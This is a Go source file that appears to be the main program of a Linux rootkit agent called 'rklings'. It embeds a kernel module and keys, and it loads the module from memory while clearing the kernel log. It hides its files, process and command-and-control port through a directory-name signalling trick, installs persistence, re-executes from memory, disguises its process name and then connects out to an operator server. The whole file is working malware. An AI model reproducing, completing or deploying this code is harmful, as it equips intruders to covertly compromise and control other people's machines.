package main

import (
	_ "embed"
	"io"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

//go:embed keys/agent.key
var agentPrivKey []byte

//go:embed keys/operator.pub
var operatorPubKey []byte

//go:embed rklings.ko
var koBytes []byte

var serverAddr = envOr("RKLINGS_SERVER_ADDR", "10.0.2.2:8443")

func main() {
	if err := acquireSingleton(); err != nil {
		os.Exit(1)
	}
	log.SetOutput(io.Discard)
	deploy()
	initTransport()
	wsLoop()
}

func deploy() {
	link, _ := os.Readlink("/proc/self/exe")
	if !strings.Contains(link, "memfd") {
		if _, err := os.Stat("/sys/module/rklings"); os.IsNotExist(err) {
			if len(koBytes) > 0 {
				if err := loadModuleFromMemory(koBytes); err != nil {
					log.Printf("load module: %v (continuing without rootkit)", err)
				}
			}
		}
		exec.Command("dmesg", "-C").Run()
		if _, err := os.Stat("/sys/module/rklings"); err == nil {
			mkdirCmd("h.m")
			mkdirCmd("h.f.rklings")
			mkdirCmd("h.c.rklings")
			mkdirCmd("h.f.systemd-kerneld")
			mkdirCmd("h.c.systemd-kerneld")
		}
		if err := installPersistence(); err != nil {
			log.Printf("persistence: %v", err)
		}
		reexecFromMemory()
	}
	masquerade()
	if _, err := os.Stat("/sys/module/rklings"); err == nil {
		mkdirCmd("h.i." + strconv.Itoa(os.Getpid()))
		if _, port, ok := strings.Cut(serverAddr, ":"); ok && port != "" {
			mkdirCmd("h.p." + port)
		}
	}
	scrubAll()
}

func mkdirCmd(name string) error {
	path := "rklings." + name
	err := os.Mkdir(path, 0755)
	_ = os.Remove(path)
	return err
}

func envOr(name, fallback string) string {
	if value := os.Getenv(name); value != "" {
		return value
	}
	return fallback
}
